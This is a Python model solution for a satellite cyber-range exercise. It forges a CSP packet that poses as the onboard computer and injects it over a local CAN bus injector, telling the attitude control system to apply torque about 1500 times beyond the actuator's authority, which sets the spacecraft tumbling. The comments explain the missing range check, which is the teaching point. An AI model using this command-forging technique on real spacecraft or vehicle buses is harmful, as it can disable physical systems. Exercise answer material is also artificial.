#!/usr/bin/env python3
"""EX-A01 model solution: spin the satellite up from the internal bus.

The attacker owns nothing on the satellite. It can put frames on the CAN bus, and that is enough -
not because the ADCS fails to check who is asking, but because it fails to check WHAT is being
asked. The torque field is a signed 16-bit integer and the magnetorquer's real authority is 20 mNm,
so the protocol hands the attacker three orders of magnitude the actuator can be commanded to
attempt.

The difference from EX-B01 is the shape of the consequence, and it is the point of the exercise.
Cutting the COMM rail is loud: telemetry stops in the same second. Spinning the spacecraft up is
quiet. Every subsystem keeps answering, the radio keeps working, the housekeeping keeps arriving -
and the panels stop making power. The operator's first evidence of a problem arrives hours later as
a battery trend.

Usage:
    python3 exercises/EX-A01-adcs-tumble/solve.py [--port N] [--torque 30000]

    --port defaults to the injector port cuberange.ports assigns satellite 0; `make out` and
    src/cuberange/ports.py are where the numbers live, so this line does not repeat them.
    python3 exercises/EX-A01-adcs-tumble/solve.py --torque 0     # stop commanding torque
"""
import argparse
import socket
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from cuberange import ports  # noqa: E402
from cuberange.proto.csp import ADDR_ADCS, encode_packet  # noqa: E402

CSP_PORT_ATT = 12
ATT_OP_SET_TORQUE = 1
AXIS_Z = 0

# The actuator's real authority, from firmware/apps/adcs/src/main.c. The mitigated build refuses
# anything outside it; the vulnerable build integrates whatever arrives.
TORQUE_AUTHORITY_MNM = 20

# The source address is forged. Nothing on this bus checks it - but note that unlike EX-B01, the
# forgery is not what makes this work. A command from the real OBC with this torque value would be
# accepted too, which is why authentication alone does not fix it.
FORGED_SRC = 1        # claim to be the OBC
SPORT = 21


def torque_command(torque_mnm: int) -> bytes:
    """[0] opcode, [1] axis, [2:4] int16 BE torque in mNm, [4:8] reserved."""
    return (bytes([ATT_OP_SET_TORQUE, AXIS_Z])
            + struct.pack(">h", torque_mnm)
            + b"\x00\x00\x00\x00")


def inject(port: int, frames) -> None:
    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    try:
        for frame in frames:
            # The injector's line protocol: "<hex can id> <hex data>".
            sock.sendall(f"{frame.can_id:x} {frame.data.hex()}\n".encode())
            print(f"  injected {frame.hex()}")
    finally:
        sock.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=ports.injector(0),
                    help="TcpCanInjector port")
    ap.add_argument("--torque", type=int, default=30000,
                    help="commanded torque in mNm; the actuator's authority is "
                         f"+-{TORQUE_AUTHORITY_MNM}")
    args = ap.parse_args()

    if not -32768 <= args.torque <= 32767:
        print("torque must fit in the int16 wire field", file=sys.stderr)
        return 2

    payload = torque_command(args.torque)
    frames = encode_packet(src=FORGED_SRC, dst=ADDR_ADCS, dport=CSP_PORT_ATT, sport=SPORT,
                           payload=payload, transfer_id=0x2B)

    ratio = abs(args.torque) / TORQUE_AUTHORITY_MNM if args.torque else 0
    print(f"forging a torque command of {args.torque} mNm to ADCS "
          f"(claiming to be node {FORGED_SRC}; that is {ratio:.0f}x the actuator's authority):")
    inject(args.port, frames)
    print("done - the satellite keeps answering. Watch the ADCS console, not the telemetry.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
